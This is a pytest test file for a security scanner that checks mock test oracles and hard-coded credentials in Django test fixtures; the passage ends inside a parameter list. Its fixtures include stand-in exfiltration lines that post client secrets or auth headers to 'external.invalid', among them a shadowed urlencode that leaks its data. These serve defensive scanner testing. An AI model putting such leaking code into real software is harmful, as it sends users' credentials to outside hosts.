from __future__ import annotations

import ast
import hashlib

from factoryline.mock_fixture_provenance import (
    django_test_secret_evidence,
    django_test_secret_index,
)
from factoryline.review_audits import security_scan
import pytest


def _write(tmp_path, relative, source):
    path = tmp_path / relative
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(source, encoding="utf-8")


def _codes(report):
    return [finding["code"] for finding in report["findings"]]


def test_magicmock_annotation_without_fixture_is_unknown(tmp_path):
    _write(
        tmp_path,
        "test_case.py",
        "from unittest.mock import MagicMock\n"
        "def exercise(module): module.write('x')\n"
        "def test_write(module: MagicMock):\n"
        "    exercise(module)\n"
        "    module.write.assert_called_once_with('x')\n",
    )
    report = security_scan(tmp_path, cache_enabled=False)
    assert "QUALITY_UNKNOWN_TEST_ORACLE" in _codes(report)
    assert "QUALITY_HOLLOW_TEST" not in _codes(report)


def test_nearest_conftest_fixture_proves_nested_magicmock_assertion(tmp_path):
    _write(
        tmp_path,
        "conftest.py",
        "import pytest\nfrom unittest.mock import MagicMock\n"
        "@pytest.fixture\ndef mocked_module(): return MagicMock()\n",
    )
    _write(
        tmp_path,
        "sub/test_case.py",
        "def exercise(module): module.child.write('x')\n"
        "def test_write(mocked_module):\n"
        "    exercise(mocked_module)\n"
        "    mocked_module.child.write.assert_called_once_with('x')\n",
    )
    report = security_scan(tmp_path, cache_enabled=False)
    assert report["finding_counts"] == {}


def test_local_noop_fixture_shadows_conftest_mock_and_stays_unknown(tmp_path):
    _write(
        tmp_path,
        "conftest.py",
        "import pytest\nfrom unittest.mock import MagicMock\n"
        "@pytest.fixture\ndef module(): return MagicMock()\n",
    )
    _write(
        tmp_path,
        "sub/test_case.py",
        "import pytest\nfrom unittest.mock import MagicMock\n"
        "class NoOp:\n"
        "    def write(self, value): pass\n"
        "    def assert_called_once_with(self, value): pass\n"
        "@pytest.fixture\ndef module(): return NoOp()\n"
        "def exercise(value): value.write('x')\n"
        "def test_write(module: MagicMock):\n"
        "    exercise(module)\n"
        "    module.assert_called_once_with('x')\n",
    )
    report = security_scan(tmp_path, cache_enabled=False)
    finding = next(
        item
        for item in report["findings"]
        if item["code"] == "QUALITY_WEAK_TEST_ORACLE"
    )
    assert finding["severity"] == "MEDIUM"
    assert finding["facts"]["whole_test_oracle"] == "UNASSESSED"


def test_nearest_noop_conftest_does_not_inherit_parent_mock_credit(tmp_path):
    _write(
        tmp_path,
        "conftest.py",
        "import pytest\nfrom unittest.mock import MagicMock\n"
        "@pytest.fixture\ndef module(): return MagicMock()\n",
    )
    _write(
        tmp_path,
        "sub/conftest.py",
        "import pytest\n"
        "class NoOp:\n"
        "    def write(self, value): pass\n"
        "    def assert_called_once_with(self, value): pass\n"
        "@pytest.fixture\ndef module(): return NoOp()\n",
    )
    _write(
        tmp_path,
        "sub/test_case.py",
        "from unittest.mock import MagicMock\n"
        "def exercise(value): value.write('x')\n"
        "def test_write(module: MagicMock):\n"
        "    exercise(module)\n"
        "    module.assert_called_once_with('x')\n",
    )
    report = security_scan(tmp_path, cache_enabled=False)
    finding = next(
        item
        for item in report["findings"]
        if item["code"] == "QUALITY_WEAK_TEST_ORACLE"
    )
    assert finding["severity"] == "MEDIUM"
    assert finding["facts"]["whole_test_oracle"] == "UNASSESSED"


def test_rebound_mock_provider_does_not_prove_fixture(tmp_path):
    _write(
        tmp_path,
        "conftest.py",
        "import pytest\nfrom unittest.mock import MagicMock as MockValue\n"
        "MockValue = NoOp\n"
        "@pytest.fixture\ndef module(): return MockValue()\n",
    )
    _write(
        tmp_path,
        "test_case.py",
        "from unittest.mock import MagicMock\n"
        "def test_write(module: MagicMock):\n"
        "    module.write.assert_called_once_with('x')\n",
    )
    codes = _codes(security_scan(tmp_path, cache_enabled=False))
    assert "QUALITY_UNKNOWN_TEST_ORACLE" in codes
    assert "QUALITY_HOLLOW_TEST" not in codes


def test_fixture_name_override_does_not_credit_function_name_parameter(tmp_path):
    _write(
        tmp_path,
        "conftest.py",
        "import pytest\nfrom unittest.mock import MagicMock\n"
        "@pytest.fixture(name='other')\ndef mocked_module(): return MagicMock()\n",
    )
    _write(
        tmp_path,
        "test_case.py",
        "from unittest.mock import MagicMock\n"
        "def test_write(mocked_module: MagicMock):\n"
        "    mocked_module.write.assert_called_once_with('x')\n",
    )
    assert "QUALITY_UNKNOWN_TEST_ORACLE" in _codes(
        security_scan(tmp_path, cache_enabled=False)
    )


def test_nearest_renamed_fixture_invalidates_parent_mock_credit(tmp_path):
    _write(
        tmp_path,
        "conftest.py",
        "import pytest\nfrom unittest.mock import MagicMock\n"
        "@pytest.fixture\ndef mocked_module(): return MagicMock()\n",
    )
    _write(
        tmp_path,
        "sub/conftest.py",
        "import pytest\nclass NoOp:\n"
        "    def __getattr__(self, name): return self\n"
        "    def __call__(self, *args): pass\n"
        "@pytest.fixture(name='mocked_module')\ndef other(): return NoOp()\n",
    )
    _write(
        tmp_path,
        "sub/test_case.py",
        "def exercise(module): module.write('x')\n"
        "def test_write(mocked_module):\n    exercise(mocked_module)\n"
        "    mocked_module.write.assert_called_once_with('wrong')\n",
    )
    assert "QUALITY_UNKNOWN_TEST_ORACLE" in _codes(
        security_scan(tmp_path, cache_enabled=False)
    )


def test_mock_constructor_attribute_override_does_not_prove_child_mock(tmp_path):
    _write(
        tmp_path,
        "conftest.py",
        "import pytest\nfrom unittest.mock import MagicMock\n"
        "class NoOp:\n    def __call__(self, value): pass\n"
        "    def assert_called_once_with(self, value): pass\n"
        "@pytest.fixture\ndef mocked_module(): return MagicMock(write=NoOp())\n",
    )
    _write(
        tmp_path,
        "test_case.py",
        "def exercise(module): module.write('x')\n"
        "def test_write(mocked_module):\n    exercise(mocked_module)\n"
        "    mocked_module.write.assert_called_once_with('wrong')\n",
    )
    assert "QUALITY_UNKNOWN_TEST_ORACLE" in _codes(
        security_scan(tmp_path, cache_enabled=False)
    )


def test_fixture_parameter_shadowing_mock_constructor_stays_unknown(tmp_path):
    _write(
        tmp_path,
        "conftest.py",
        "import pytest\nfrom unittest.mock import MagicMock\n"
        "class NoOp:\n    def __getattr__(self, name): return self\n"
        "    def __call__(self, *args): pass\n"
        "@pytest.fixture\ndef mocked_module(MagicMock=lambda: NoOp()):\n"
        "    return MagicMock()\n",
    )
    _write(
        tmp_path,
        "test_case.py",
        "def exercise(module): module.write('x')\n"
        "def test_write(mocked_module):\n    exercise(mocked_module)\n"
        "    mocked_module.write.assert_called_once_with('wrong')\n",
    )
    assert "QUALITY_UNKNOWN_TEST_ORACLE" in _codes(
        security_scan(tmp_path, cache_enabled=False)
    )


def test_decorated_noop_class_is_not_proven_inert(tmp_path):
    _write(
        tmp_path,
        "conftest.py",
        "import pytest\n"
        "def add_real_assertion(cls):\n"
        "    cls.assert_called_once_with = lambda self, value: None\n"
        "    return cls\n@add_real_assertion\nclass NoOp:\n"
        "    def assert_called_once_with(self, value): pass\n"
        "@pytest.fixture\ndef mocked_module(): return NoOp()\n",
    )
    _write(
        tmp_path,
        "test_case.py",
        "def test_write(mocked_module):\n"
        "    mocked_module.assert_called_once_with('wrong')\n",
    )
    codes = _codes(security_scan(tmp_path, cache_enabled=False))
    assert "QUALITY_WEAK_TEST_ORACLE" not in codes


_MODEL = """from django.db import models
from django.apps import apps
from django.contrib.auth.hashers import identify_hasher, make_password
from sample.settings import config
import logging
logger = logging.getLogger(__name__)
class SecretField(models.CharField):
    def pre_save(self, model_instance, add):
        secret = getattr(model_instance, self.attname)
        if not getattr(model_instance, 'hash_client_secret', True):
            return super().pre_save(model_instance, add)
        try:
            hasher = identify_hasher(secret)
            logger.debug(f'{model_instance}: {self.attname} uses {hasher}')
        except ValueError:
            logger.debug(f'{model_instance}: {self.attname} needs hashing')
            hashed_secret = make_password(secret, hasher=config.CLIENT_SECRET_HASHER)
            setattr(model_instance, self.attname, hashed_secret)
            return hashed_secret
        return super().pre_save(model_instance, add)
class Record(models.Model):
    client_secret = SecretField()
    def __str__(self): return self.name or self.client_id
class RecordManager(models.Manager):
    pass
class ClientApplication(Record):
    objects = RecordManager()
def select_model():
    return apps.get_model(config.APPLICATION_MODEL)
"""


_FORM = """from urllib.parse import urlencode
MEDIA_TYPE = 'application/x-www-form-urlencoded'
def submit_form(client, path, data=None, **extra):
    extra.setdefault('CONTENT_TYPE', MEDIA_TYPE)
    return client.post(path, data=urlencode(data or {}, doseq=True), content_type=MEDIA_TYPE, **extra)
"""


_TEST = """import pytest
from sample.models import select_model
from tests.helpers import submit_form
@pytest.mark.django_db
def test_login(client):
    Application = select_model()
    client_secret = 'owned-fixture-58a92'
    app = Application.objects.create(client_secret=client_secret)
    response = submit_form(client, '/token', {'client_secret': client_secret})
    assert response.status_code == 200
"""


_CLASS_TEST = """from django.test import TestCase
from sample.models import select_model
from tests.helpers import basic_header, submit_form
Application = select_model()
client_secret = 'owned-fixture-58a92'
class LocalTests(TestCase):
    @classmethod
    def setUpTestData(cls):
        cls.application = Application.objects.create(client_secret=client_secret)
    def test_login(self):
        headers = basic_header('account', client_secret)
        response = submit_form(self.client, '/token', {}, **headers)
        assert response.status_code == 200
"""


_HEADER = """
import base64
def basic_header(user, password):
    user_pass = '{0}:{1}'.format(user, password)
    auth_string = base64.b64encode(user_pass.encode('utf-8'))
    auth_headers = {'HTTP_AUTHORIZATION': 'Basic ' + auth_string.decode('utf-8')}
    return auth_headers
"""


def _fixture_project(root, test_source=_TEST, model_source=_MODEL, helper_source=_FORM):
    sources = {
        "pyproject.toml": "[project.optional-dependencies]\ntest=['pytest>=8','pytest-django>=4']\n",
        "tox.ini": "[testenv]\ncommands=pytest {posargs}\nsetenv=\n DJANGO_SETTINGS_MODULE=tests.settings\n",
        "tests/settings.py": "DATABASES={'default':{'ENGINE':'django.db.backends.sqlite3','NAME':':memory:'}}\nAPP_MODEL='sample.ClientApplication'\n",
        "sample/settings.py": "from django.conf import settings\nAPPLICATION_MODEL=getattr(settings,'APP_MODEL','sample.ClientApplication')\nconfig=object()\n",
        "sample/models.py": model_source,
        "tests/helpers.py": helper_source,
        "tests/test_auth.py": test_source,
    }
    for name, text in sources.items():
        _write(root, name, text)


@pytest.mark.parametrize(
    "before,after",
    [
        (
            "Application = select_model()",
            "Application = select_model()\n    Application = EvilModel",
        ),
        ("client_secret =", "client = External()\n    client_secret ="),
        ("client_secret=client_secret)", "client_secret=leak(client_secret))"),
        ("{'client_secret': client_secret}", "{'client_secret': leak(client_secret)}"),
        ("def test_login(client):", "def test_login(client=External()):"),
        ("def test_login(client):", "def test_login(client, select_model):"),
    ],
)
def test_django_fixture_unresolved_provider_or_nested_escape_stays_active(
    tmp_path, before, after
):
    assert before in _TEST
    _fixture_project(tmp_path, test_source=_TEST.replace(before, after))
    _assert_fixture_credential_active(tmp_path)


@pytest.mark.parametrize(
    "extra",
    [
        "logger.debug(secret)",
        "logger.debug(model_instance.client_secret)",
        "setattr(logger, 'exposed', secret)",
        "exposed = secret\n        logger.debug(exposed)",
        "setattr = logger.debug",
        "make_password = logger.debug",
    ],
)
def test_django_field_effect_rejects_exports_and_provider_mutation(tmp_path, extra):
    anchor = "        secret = getattr(model_instance, self.attname)"
    source = _MODEL.replace(anchor, anchor + "\n        " + extra)
    _fixture_project(tmp_path, model_source=source)
    _assert_fixture_credential_active(tmp_path)


def test_django_fixture_nearer_renamed_client_override_stays_active(tmp_path):
    _fixture_project(tmp_path)
    _write(
        tmp_path,
        "tests/conftest.py",
        "import pytest\n@pytest.fixture(name='client')\ndef remote(): return External()\n",
    )
    _assert_fixture_credential_active(tmp_path)


@pytest.mark.parametrize(
    "before,after",
    [
        (
            "headers = basic_header('account', client_secret)",
            "headers = basic_header('account', client_secret)\n        requests.post('https://external.invalid', headers=headers)",
        ),
        ("**headers)", "**leak(headers))"),
        (
            "class LocalTests(TestCase):",
            "Application = EvilModel\nclass LocalTests(TestCase):",
        ),
        (
            "class LocalTests(TestCase):",
            "Application.objects.create = leak\nclass LocalTests(TestCase):",
        ),
        (
            "def setUpTestData(cls):",
            "def setUpTestData(cls):\n        Application = EvilModel",
        ),
        (
            "class LocalTests(TestCase):",
            "class LocalTests(TestCase):\n    client_class = External",
        ),
        (
            "def test_login(self):",
            "def test_login(self):\n        self.client = External()",
        ),
        (
            "Application.objects.create(client_secret=client_secret)",
            "opaque(Application).objects.create(client_secret=client_secret)",
        ),
    ],
)
def test_django_class_fixture_derived_exports_and_provider_replacement_stay_active(
    tmp_path, before, after
):
    assert before in _CLASS_TEST
    _fixture_project(
        tmp_path,
        test_source=_CLASS_TEST.replace(before, after),
        helper_source=_FORM + _HEADER,
    )
    _assert_fixture_credential_active(tmp_path)


def _assert_fixture_credential_active(root):
    report = security_scan(root, cache_enabled=False)
    findings = [
        finding
        for finding in report["findings"]
        if finding["path"] == "tests/test_auth.py"
        and finding["code"] == "SECURITY_HARDCODED_SECRET"
    ]
    assert len(findings) == 1
    assert findings[0]["severity"] == "CRITICAL"


_authority128_MODEL = """from django.db import models
from django.apps import apps
from .settings import oauth2_settings
class SecretField(models.CharField):
    pass
class Record(models.Model):
    client_secret = SecretField()
class RecordManager(models.Manager):
    pass
class ClientApplication(Record):
    objects = RecordManager()
def get_application_model():
    return apps.get_model(oauth2_settings.APPLICATION_MODEL)
"""


_authority128_FORM = """from urllib.parse import urlencode
def post_form(client, path, data=None, **extra):
    return client.post(path, data=urlencode(data or {}, doseq=True), **extra)
"""


_authority128_TEST = """import pytest
from sample.models import get_application_model
from tests.helpers import post_form as request_token
@pytest.mark.django_db
def test_login(client):
    Application = get_application_model()
    client_secret = "owned-fixture-58a92"
    app = Application.objects.create(client_secret=client_secret)
    return request_token(client, "/token", {"client_secret": client_secret})
"""


def _authority128_fixture_project(
    root,
    test_source=_authority128_TEST,
    model_source=_authority128_MODEL,
    helper_source=_authority128_FORM,
):
    sources = {
        "pyproject.toml": "[project.optional-dependencies]\ntest=['pytest>=8','pytest-django>=4']\n",
        "tox.ini": "[testenv]\ncommands=pytest {posargs}\nextras=test\nsetenv=\n DJANGO_SETTINGS_MODULE=tests.settings\n",
        "tests/settings.py": "DATABASES={'default':{'ENGINE':'django.db.backends.sqlite3','NAME':':memory:'}}\nINSTALLED_APPS=('sample',)\nOAUTH2_PROVIDER_APPLICATION_MODEL='sample.ClientApplication'\n",
        "sample/settings.py": "from django.conf import settings\nAPPLICATION_MODEL=getattr(settings,'OAUTH2_PROVIDER_APPLICATION_MODEL','sample.ClientApplication')\nDEFAULTS={'APPLICATION_MODEL':APPLICATION_MODEL}\nUSER_SETTINGS=getattr(settings,'OAUTH2_PROVIDER',None)\nclass Settings:\n    def __init__(self,user_settings=None,defaults=None):\n        self.user_settings=user_settings or {}\n        self.defaults=defaults or DEFAULTS\n    def __getattr__(self,attr):\n        return self.user_settings.get(attr,self.defaults[attr])\noauth2_settings=Settings(USER_SETTINGS,DEFAULTS)\n",
        "sample/models.py": model_source,
        "tests/helpers.py": helper_source,
        "tests/test_auth.py": test_source,
    }
    for name, text in sources.items():
        _write(root, name, text)


def _captured_fixture_evidence(root, value="owned-fixture-58a92"):
    modules, source_bytes, inventory = {}, {}, {}
    for path in root.rglob("*.py"):
        raw = path.read_bytes()
        tree = ast.parse(raw)
        digest = hashlib.sha256(raw).hexdigest()
        tree._oracle_source_sha256 = digest
        modules[path], source_bytes[path], inventory[path] = tree, raw, digest
    configs = {
        name: (root / name).read_bytes() for name in ("pyproject.toml", "tox.ini")
    }
    index = django_test_secret_index(
        root, modules, configs, source_bytes=source_bytes, inventory=inventory
    )
    path = root / "tests/test_auth.py"
    literals = [
        node
        for node in ast.walk(modules[path])
        if isinstance(node, ast.Constant) and node.value == value
    ]
    assert len(literals) == 1
    return django_test_secret_evidence(index, path, literals[0].lineno, value)


def test_django_fixture_requires_captured_bytes_and_resolves_local_authority(tmp_path):
    _authority128_fixture_project(tmp_path)
    evidence = _captured_fixture_evidence(tmp_path)
    assert evidence["eligible"] is True
    assert evidence["classification"] == "TEST_OWNED_LOCAL_FIXTURE"
    assert evidence["transport"]["exclusivity"] == "UNASSESSED"
    assert "owned-fixture-58a92" not in repr(evidence)
    assert evidence["source_sha256"]
    assert evidence["inventory_sha256"]


def test_django_fixture_allows_only_source_bound_literal_model_projections(tmp_path):
    model = _authority128_MODEL.replace(
        "class ClientApplication(Record):\n    objects = RecordManager()",
        "class ClientApplication(Record):\n"
        "    CLIENT_CONFIDENTIAL = 'confidential'\n"
        "    objects = RecordManager()",
    )
    test_source = _authority128_TEST.replace(
        "    return request_token",
        "    grant_type = Application.CLIENT_CONFIDENTIAL\n    return request_token",
    )
    _authority128_fixture_project(tmp_path, test_source=test_source, model_source=model)
    assert _captured_fixture_evidence(tmp_path)["eligible"] is True


@pytest.mark.parametrize(
    "test_source",
    [
        _authority128_TEST.replace(
            'client_secret = "owned-fixture-58a92"',
            'client_secret = "owned-fixture-58a92"\n    client_secret = external()',
        ),
        _authority128_TEST.replace(
            "client_secret=client_secret", "client_secret=external(client_secret)"
        ),
        _authority128_TEST.replace(
            '{"client_secret": client_secret}',
            '{"client_secret": external(client_secret)}',
        ),
        _authority128_TEST.replace(
            "    app = Application.objects.create",
            "    mutate(Application)\n    app = Application.objects.create",
        ),
        _authority128_TEST.replace(
            "    return request_token", "    mutate(client)\n    return request_token"
        ),
        _authority128_TEST.replace(
            "@pytest.mark.django_db",
            "@pytest.mark.django_db\n@settings_override({'OAUTH2_PROVIDER_APPLICATION_MODEL': 'other.App'})",
        ),
    ],
)
def test_django_fixture_reassignment_or_unresolved_authority_stays_active(
    tmp_path, test_source
):
    _authority128_fixture_project(tmp_path, test_source=test_source)
    assert _captured_fixture_evidence(tmp_path)["eligible"] is False


def test_django_fixture_class_and_module_literals_are_out_of_scope(tmp_path):
    _authority128_fixture_project(
        tmp_path, test_source="secret = 'owned-fixture-58a92'\n"
    )
    assert _captured_fixture_evidence(tmp_path)["eligible"] is False
    _authority128_fixture_project(
        tmp_path, test_source="class Tests:\n    secret = 'owned-fixture-58a92'\n"
    )
    assert _captured_fixture_evidence(tmp_path)["eligible"] is False


def test_django_fixture_rejects_custom_manager_and_production_database(tmp_path):
    _authority128_fixture_project(
        tmp_path,
        model_source=_authority128_MODEL.replace(
            "class RecordManager(models.Manager):\n    pass",
            "class RecordManager(models.Manager):\n    def create(self, **kwargs): return External(**kwargs)",
        ),
    )
    assert _captured_fixture_evidence(tmp_path)["eligible"] is False


def test_django_fixture_rejects_multiple_model_bases(tmp_path):
    _authority128_fixture_project(
        tmp_path,
        model_source=_authority128_MODEL.replace(
            "class ClientApplication(Record):",
            "class ApplicationMixin: pass\nclass ClientApplication(ApplicationMixin, Record):",
        ),
    )
    assert _captured_fixture_evidence(tmp_path)["eligible"] is False


def test_django_fixture_rejects_provider_and_import_shadowing(tmp_path):
    _authority128_fixture_project(tmp_path)
    path = tmp_path / "sample/settings.py"
    path.write_text(path.read_text() + "\ngetattr = external_getattr\n")
    assert _captured_fixture_evidence(tmp_path)["eligible"] is False

    _authority128_fixture_project(tmp_path)
    path = tmp_path / "sample/models.py"
    path.write_text(path.read_text() + "\napps = external_apps\n")
    assert _captured_fixture_evidence(tmp_path)["eligible"] is False

    _authority128_fixture_project(tmp_path)
    path = tmp_path / "tests/helpers.py"
    path.write_text(path.read_text() + "\nurlencode = external_urlencode\n")
    assert _captured_fixture_evidence(tmp_path)["eligible"] is False


def test_django_fixture_rejects_test_database_subscript_mutation(tmp_path):
    source = _authority128_TEST.replace(
        '    client_secret = "owned-fixture-58a92"',
        "    client_secret = \"owned-fixture-58a92\"\n    settings.DATABASES['default']['NAME'] = 'production.sqlite3'",
    ).replace("import pytest", "import pytest\nfrom django.conf import settings")
    _authority128_fixture_project(tmp_path, test_source=source)
    assert _captured_fixture_evidence(tmp_path)["eligible"] is False


def test_django_fixture_rejects_registered_plugins_and_plugin_option(tmp_path):
    _authority128_fixture_project(tmp_path)
    _write(tmp_path, "tests/conftest.py", "pytest_plugins = ['remote_client_plugin']\n")
    assert _captured_fixture_evidence(tmp_path)["eligible"] is False

    _authority128_fixture_project(tmp_path)
    path = tmp_path / "pyproject.toml"
    path.write_text(
        path.read_text()
        + "\n[tool.pytest.ini_options]\naddopts='-p remote_client_plugin'\n"
    )
    assert _captured_fixture_evidence(tmp_path)["eligible"] is False


@pytest.mark.parametrize(
    "mutations",
    [
        pytest.param(
            {
                "tests/test_auth.py": _authority128_TEST
                + "\n@pytest.fixture(name='client')\ndef remote_client(): return External()\n"
            },
            id="test-module-client-fixture-override",
        ),
        pytest.param(
            {
                "tests/test_auth.py": _authority128_TEST.replace(
                    "def test_login(client):",
                    "def test_login(client, get_application_model):",
                )
            },
            id="factory-name-shadowed-by-parameter",
        ),
        pytest.param(
            {
                "tests/test_auth.py": _authority128_TEST.replace(
                    "    return request_token",
                    "    request_token = External()\n    return request_token",
                )
            },
            id="form-helper-local-rebinding",
        ),
        pytest.param(
            {
                "tests/test_auth.py": _authority128_TEST.replace(
                    "    app = Application.objects.create",
                    "    Application.objects.create = external_create\n"
                    "    app = Application.objects.create",
                )
            },
            id="nested-manager-method-replacement",
        ),
        pytest.param(
            {
                "sample/models.py": _authority128_MODEL.replace(
                    "class RecordManager(models.Manager):\n    pass",
                    "class RecordManager(models.Manager):\n"
                    "    def get_queryset(self): return ExternalQuerySet()",
                )
            },
            id="manager-effective-queryset-override",
        ),
        pytest.param(
            {
                "sample/models.py": _authority128_MODEL.replace(
                    "class SecretField(models.CharField):\n    pass",
                    "class SecretField(models.CharField):\n"
                    "    def __getattribute__(self, name): return external(name)\n"
                    "    pass",
                )
            },
            id="field-effective-getattribute-override",
        ),
        pytest.param(
            {
                "sample/models.py": _authority128_MODEL.replace(
                    "class ClientApplication(Record):\n    objects = RecordManager()",
                    "class ClientApplication(Record):\n"
                    "    save = external_save\n    objects = RecordManager()",
                )
            },
            id="model-save-class-assignment-override",
        ),
        pytest.param(
            {
                "sample/models.py": _authority128_MODEL
                + "\ngetattr = external_getattr\n"
            },
            id="model-module-builtin-rebinding",
        ),
        pytest.param(
            {
                "tests/settings.py": (
                    "DATABASES={'default':{'ENGINE':'django.db.backends.sqlite3','NAME':':memory:'}}\n"
                    "INSTALLED_APPS=('sample',)\n"
                    "OAUTH2_PROVIDER_APPLICATION_MODEL='sample.ClientApplication'\n"
                    "DATABASES['default'].update(NAME='production.sqlite3')\n"
                )
            },
            id="database-config-dict-update",
        ),
        pytest.param(
            {
                "django/__init__.py": "",
                "django/test.py": "import requests\nclass TestCase: client=requests.Session()\n",
            },
            id="canonical-django-provider-root-shadow",
        ),
        pytest.param(
            {
                "urllib/__init__.py": "",
                "urllib/parse.py": "import requests\ndef urlencode(data,**kw):\n    requests.post('https://external.invalid',data=data)\n    return ''\n",
            },
            id="canonical-urllib-provider-root-shadow",
        ),
        pytest.param(
            {
                "tests/test_auth.py": _authority128_TEST.replace(
                    "    app = Application.objects.create(client_secret=client_secret)",
                    "    mutate(Application); app = Application.objects.create(client_secret=client_secret)",
                )
            },
            id="same-line-provider-mutation-before-create",
        ),
        pytest.param(
            {
                "tests/test_auth.py": _authority128_TEST.replace(
                    "    app = Application.objects.create",
                    "    manager_alias = Application.objects\n"
                    "    manager_alias.create = external_create\n"
                    "    app = Application.objects.create",
                )
            },
            id="manager-alias-replacement-before-create",
        ),
        pytest.param(
            {
                "tests/test_auth.py": _authority128_TEST.replace(
                    "    app = Application.objects.create",
                    "    selected_writer = Application.objects.db_manager('default').create\n"
                    "    selected_writer = external_create\n"
                    "    app = Application.objects.create",
                )
            },
            id="renamed-nested-capability-projection",
        ),
    ],
)
def test_authority_review126_reproducers_stay_unproven(tmp_path, mutations):
    _authority128_fixture_project(tmp_path)
    for relative, source in mutations.items():
        _write(tmp_path, relative, source)
    assert _captured_fixture_evidence(tmp_path)["eligible"] is False
    _authority128_fixture_project(tmp_path)
    path = tmp_path / "tests/settings.py"
    path.write_text(path.read_text().replace(":memory:", "production.sqlite3"))
    assert _captured_fixture_evidence(tmp_path)["eligible"] is False


def test_django_fixture_rejects_reachable_model_signal_registration(tmp_path):
    _authority128_fixture_project(tmp_path)
    _write(
        tmp_path,
        "sample/apps.py",
        "from django.apps import AppConfig\n"
        "class SampleConfig(AppConfig):\n"
        "    name = 'sample'\n"
        "    def ready(self):\n"
        "        from . import signals\n",
    )
    _write(
        tmp_path,
        "sample/signals.py",
        "from django.db.models.signals import pre_save\n"
        "def callback(sender, instance, **kwargs): pass\n"
        "pre_save.connect(callback, sender='sample.ClientApplication')\n",
    )
    assert _captured_fixture_evidence(tmp_path)["eligible"] is False

    _authority128_fixture_project(tmp_path)
    _write(
        tmp_path,
        "tests/conftest.py",
        "from django.db.models.signals import pre_save\n"
        "pre_save.connect(external_callback)\n",
    )
    assert _captured_fixture_evidence(tmp_path)["eligible"] is False


def test_django_fixture_rejects_registered_signal_callable_alias(tmp_path):
    _authority128_fixture_project(tmp_path)
    path = tmp_path / "sample/models.py"
    path.write_text(
        path.read_text() + "\nfrom django.db.models.signals import pre_save\n"
        "def callback(sender,instance,**kwargs):\n"
        "    instance.client_secret=external_credential()\n"
        "register = pre_save.connect\n"
        "register(callback,sender=ClientApplication,weak=False)\n"
    )
    assert _captured_fixture_evidence(tmp_path)["eligible"] is False


def test_django_fixture_rejects_nearer_client_override_and_stale_capture(tmp_path):
    _authority128_fixture_project(tmp_path)
    _write(
        tmp_path,
        "tests/conftest.py",
        "import pytest\n@pytest.fixture(name='client')\ndef remote(): return External()\n",
    )
    assert _captured_fixture_evidence(tmp_path)["eligible"] is False
    _authority128_fixture_project(tmp_path)
    modules, source_bytes, inventory = {}, {}, {}
    for path in tmp_path.rglob("*.py"):
        raw = path.read_bytes()
        tree = ast.parse(raw)
        digest = hashlib.sha256(raw).hexdigest()
        tree._oracle_source_sha256 = digest
        modules[path], source_bytes[path], inventory[path] = tree, raw, digest
    configs = {
        name: (tmp_path / name).read_bytes() for name in ("pyproject.toml", "tox.ini")
    }
    index = django_test_secret_index(
        tmp_path, modules, configs, source_bytes=source_bytes, inventory=inventory
    )
    path = tmp_path / "tests/test_auth.py"
    source_bytes[path] = b"def changed(): pass\n"
    assert (
        django_test_secret_evidence(index, path, 6, "owned-fixture-58a92")["eligible"]
        is False
    )


def test_django_external_transport_is_not_misreported_as_role_guard(tmp_path):
    source = _authority128_TEST.replace(
        '    return request_token(client, "/token", {"client_secret": client_secret})',
        '    requests.post("https://external.invalid", data=client_secret)\n    return request_token(client, "/token", {"client_secret": client_secret})',
    )
    _authority128_fixture_project(tmp_path, test_source=source)
    evidence = _captured_fixture_evidence(tmp_path)
    assert evidence["eligible"] is True
    assert evidence["transport"]["exclusivity"] == "UNASSESSED"
    assert "network_consumer_guard" not in evidence


def test_django_fixture_scanner_cold_warm_and_config_drift(tmp_path):
    _authority128_fixture_project(tmp_path)
    for _ in range(2):
        report = security_scan(tmp_path)
        assert not [
            f
            for f in report["findings"]
            if f["code"] == "SECURITY_HARDCODED_SECRET"
            and f["path"] == "tests/test_auth.py"
        ]
        observed = [
            f
            for f in report.get("primitive_observations", [])
            if f["path"] == "tests/test_auth.py"
        ]
        assert len(observed) == 1
        assert observed[0]["severity"] == "CRITICAL"
        assert observed[0]["facts"]["disposition"] == "TEST_OWNED_LOCAL_FIXTURE"
    path = tmp_path / "tests/settings.py"
    path.write_text(path.read_text().replace(":memory:", "production.sqlite3"))
    report = security_scan(tmp_path)
    active = [
        f
        for f in report["findings"]
        if f["code"] == "SECURITY_HARDCODED_SECRET"
        and f["path"] == "tests/test_auth.py"
    ]
    assert len(active) == 1 and active[0]["severity"] == "CRITICAL"


_APP133_DRF = """import base64
from rest_framework import HTTP_HEADER_ENCODING
from rest_framework.test import APITestCase
from django.contrib.auth.models import User

class LoginCheck(APITestCase):
    def test_login(self):
        username = "created-user"
        password = "fixture-credential"
        User.objects.create_user(username=username, password=password)
        credentials = f"{username}:{password}"
        encoded = base64.b64encode(credentials.encode(HTTP_HEADER_ENCODING)).decode(HTTP_HEADER_ENCODING)
        self.client.credentials(HTTP_AUTHORIZATION=f"Basic {encoded}")
        response = self.client.post("/session")
        self.assertEqual(response.status_code, 200)
"""


def _app133_drf_projection(tmp_path, text, *, corrupt_source=False):
    from factoryline.mock_fixture_provenance import (
        application_test_index,
        application_test_secret_evidence,
    )

    path = tmp_path / "checks" / "login.py"
    raw = text.encode()
    tree = ast.parse(raw)
    tree._oracle_source_sha256 = hashlib.sha256(raw).hexdigest()
    modules, sources, inventory = (
        {path: tree},
        {path: raw},
        {path: tree._oracle_source_sha256},
    )
    if corrupt_source:
        sources[path] += b"\n# stale capture"
    index = application_test_index(tmp_path, modules, sources, inventory)
    assignment = next(
        node
        for node in ast.walk(tree)
        if isinstance(node, ast.Assign)
        and len(node.targets) == 1
        and isinstance(node.targets[0], ast.Name)
        and node.targets[0].id == "password"
    )
    return application_test_secret_evidence(
        index, path, assignment.value.lineno, assignment.value.value
    )


def test_application133_credential_role_uses_authority_not_filename(tmp_path):
    evidence = _app133_drf_projection(tmp_path, _APP133_DRF)
    assert evidence["eligible"] is True
    assert evidence["runtime_assurance"] == "INCOMPLETE"
    assert evidence["transport_role"] == "UNASSESSED"
    assert evidence["target_execution"] == "not_performed"
    assert evidence["witness_sources"]


@pytest.mark.parametrize(
    ("old", "new"),
    [
        (
            "username=username, password=password",
            'username="existing-user", password=password',
        ),
        ('credentials = f"{username}:{password}"', 'credentials = f"other:{password}"'),
        ("{username}:{password}", "{password}:{username}"),
        (
            "credentials.encode(HTTP_HEADER_ENCODING)",
            "(password * 0).encode(HTTP_HEADER_ENCODING)",
        ),
        (
            "        self.client.credentials(",
            "        self.client = foreign_client\n        self.client.credentials(",
        ),
        (
            "        User.objects.create_user(",
